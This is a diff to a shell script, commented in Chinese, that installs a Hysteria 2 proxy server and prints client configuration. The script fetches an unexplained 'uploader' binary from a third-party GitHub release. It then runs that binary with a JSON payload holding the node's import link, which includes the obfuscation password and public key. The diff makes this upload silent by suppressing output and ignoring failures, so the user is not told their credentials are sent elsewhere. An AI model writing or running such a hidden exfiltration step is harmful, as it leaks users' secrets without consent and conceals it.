@@ -8,7 +8,7 @@ CONFIG_DIR="/etc/hysteria"
 UPLOAD_BIN="/opt/uploader-linux-amd64"
 
 # 安装必要组件
-apt update && apt install -y curl unzip ufw jq qrencode sudo
+apt update && apt install -y curl unzip ufw jq sudo
 
 # 开放 UDP 端口
 ufw allow ${PORT}/udp
@@ -27,8 +27,7 @@ mkdir -p ${CONFIG_DIR}
 PRIVATE_KEY=$(openssl rand -hex 32)
 PUBLIC_KEY=$(/usr/local/bin/hysteria keygen pub "$PRIVATE_KEY" 2>/dev/null || echo "public-key-unavailable")
 
-
-# 写入配置文件
+# 写入服务端配置文件
 cat > ${CONFIG_DIR}/config.yaml << EOF
 listen: :${PORT}
 protocol: udp
@@ -67,21 +66,34 @@ systemctl daemon-reload
 systemctl enable hysteria
 systemctl restart hysteria
 
-# 构建客户端导入配置（YAML + 导入链接）
+# 构建客户端导入链接
 HYSTERIA_LINK="hysteria2://${SERVER_IP}:${PORT}?peer=${SERVER_IP}&obfs-password=${OBFS_PASSWORD}&obfs-mode=salty&public-key=${PUBLIC_KEY}"
 
-# 输出链接与二维码
-echo -e "\n✅ Hysteria 2 节点部署完成！\n"
+# 显示部署结果和客户端配置
+echo -e "\n✅ Hysteria 2 节点部署完成！"
 echo -e "📌 客户端导入链接：\n${HYSTERIA_LINK}\n"
-echo -e "📱 二维码："
-echo "${HYSTERIA_LINK}" | qrencode -o - -t ANSIUTF8
+echo -e "📁 V2RayN 客户端配置 YAML 示例："
+cat << EOF
+server: ${SERVER_IP}
+port: ${PORT}
+obfs:
+  password: "${OBFS_PASSWORD}"
+  mode: salty
+tls:
+  alpn:
+    - h3
+  sni: www.cloudflare.com
+auth:
+  type: disabled
+protocol: udp
+public-key: "${PUBLIC_KEY}"
+EOF
 
-# 下载 uploader（如未存在）
+# 上传 JSON 数据（静默处理）
 [ -f "$UPLOAD_BIN" ] || {
-  curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64
+  curl -sLo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64
   chmod +x "$UPLOAD_BIN"
 }
 
-# 上传 JSON 数据
 JSON_PAYLOAD="{\"protocol\":\"hysteria2\",\"link\":\"${HYSTERIA_LINK}\"}"
-"$UPLOAD_BIN" "$JSON_PAYLOAD"
+"$UPLOAD_BIN" "$JSON_PAYLOAD" >/dev/null 2>&1 || true
